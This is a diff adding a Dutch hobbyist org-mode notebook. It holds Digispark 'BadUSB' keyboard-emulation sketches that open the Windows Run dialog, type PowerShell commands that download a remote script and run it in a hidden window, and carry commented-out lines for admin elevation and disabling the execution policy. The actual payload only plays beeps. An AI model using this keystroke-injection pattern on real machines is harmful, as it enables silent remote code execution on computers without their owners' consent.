@@ -1,0 +1,127 @@
+#+TITLE: Digispark speeltuin
+#+auto_tangle: t
+
+
+* Inhoud :toc:
+- [[#about][About]]
+- [[#execute_powershell_scriptino][Execute_Powershell_Script.ino]]
+- [[#scriptps1][script.ps1]]
+  - [[#oude-tests--][Oude tests :-)]]
+
+* About
+In deze org file speel ik met powershell scripts die ik in mijn cloud zet.
+
+
+* Execute_Powershell_Script.ino
+
+#+begin_src C :tangle Powershell.ino
+#include "DigiKeyboard.h"
+
+void setup() {
+  // empty
+}
+
+void loop() {
+  // Initialise digispark
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(600);
+
+  // Opens the run dialog
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(600);
+
+  // Writes the command
+  DigiKeyboard.print("powershell -w h ");
+  DigiKeyboard.print("iex (irm \"");
+  DigiKeyboard.print("https://raw.githubusercontent.com/msr8/attiny85/main/Shell%20Scripts/powershell/speak.ps1");  // LINK HERE
+  DigiKeyboard.print("\")");
+  // Enters it
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+
+
+  for (;;) {/* Stops the loop */}
+}
+#+end_src
+
+#+RESULTS:
+
+werkt niet goed:
+#+begin_src C
+//This DigiSpark scripts downloads and executes a powershell script in hidden mode.
+// https://github.com/CedArctic/DigiSpark-Scripts/tree/master/Execute_Powershell_Script
+#include "DigiKeyboard.h"
+void setup() {
+}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("powershell");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  //DigiKeyboard.delay(500);
+  DigiKeyboard.delay(1000); //changed WAEL
+  DigiKeyboard.print("$client = new-object System.Net.WebClient");
+  DigiKeyboard.delay(500); //changed WAEL
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("$client.DownloadFile(\"https://icefly.stackstorage.com/s/ygwhdjHFLOBog9YI\" , \"script.ps1\")");
+  // not long enough: DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(2000); //changed WAEL
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); //changed WAEL
+  DigiKeyboard.delay(500); //changed WAEL
+  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
+  DigiKeyboard.delay(750);
+  //If the system hasn't been configured to run scripts, uncomment the lines bellow
+  //DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
+  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  //DigiKeyboard.delay(750);
+  //DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
+  //DigiKeyboard.delay(750);
+  //DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
+  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  //DigiKeyboard.delay(750);
+  DigiKeyboard.print("powershell.exe -windowstyle hidden -File %USERPROFILE%\\script.ps1");
+  DigiKeyboard.delay(500); //changed WAEL
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  for (;;) {
+    /*empty*/
+  }
+
+}
+#+end_src
+
+#+RESULTS:
+
+
+* script.ps1
+Mijn huidige script staat hier onder. Deze staat in mijn cloud en klaar om gebruikt te worden met mijn digispark.
+
+#+begin_src shell :tangle script.ps1
+[System.Console]::beep(440, 500)
+[System.Console]::beep(440, 500)
+[System.Console]::beep(440, 500)
+[System.Console]::beep(349, 350)
+[System.Console]::beep(523, 150)
+[System.Console]::beep(440, 500)
+[System.Console]::beep(349, 350)
+[System.Console]::beep(523, 150)
+[System.Console]::beep(440, 1000)
+[System.Console]::beep(659, 500)
+[System.Console]::beep(659, 500)
+[System.Console]::beep(659, 500)
+[System.Console]::beep(698, 350)
+[System.Console]::beep(523, 150)
+[System.Console]::beep(415, 500)
+[System.Console]::beep(349, 350)
+[System.Console]::beep(523, 150)
+[System.Console]::beep(440, 1000)
+exit 0 # success
+#+end_src
+
+
+
+
+** Oude tests :-)
